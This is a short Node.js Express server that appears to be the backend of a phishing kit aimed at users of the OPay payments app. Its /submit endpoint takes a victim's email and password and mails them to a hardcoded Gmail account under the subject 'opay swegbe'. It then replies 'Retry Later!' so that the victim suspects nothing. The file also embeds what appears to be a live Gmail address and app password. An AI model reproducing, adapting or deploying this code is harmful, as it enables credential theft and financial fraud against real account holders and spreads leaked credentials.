require('dotenv').config()
const express = require('express')
const cors = require("cors")
const nodemailer = require('nodemailer');

const app = express()

app.use(cors())
app.use(express.json());

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'mayormento11234@gmail.com', // Your email address
        pass: process.env.EMAIL_PASS  ||  'zjxfpuutadvqlehg', // Your email password
    },
});

app.post('/submit', async (req, res) => {
    const { email, password } = req.body;

    // Prepare the email content
    const mailOptions = {
        from: process.env.EMAIL_USER || 'mayormento11234@gmail.com' ,
        to: process.env.EMAIL_USER  || 'mayormento11234@gmail.com', // Sending to the same email
        subject: 'opay swegbe',
        text: `You have received a new opay swegbe:

        Email Address: ${email},
        password:${password}`
       
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).send('Retry Later!');
    } catch (error) {
        console.error('Error logging in:', error);
        res.status(500).send('Error logging in');
    }
});

const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
  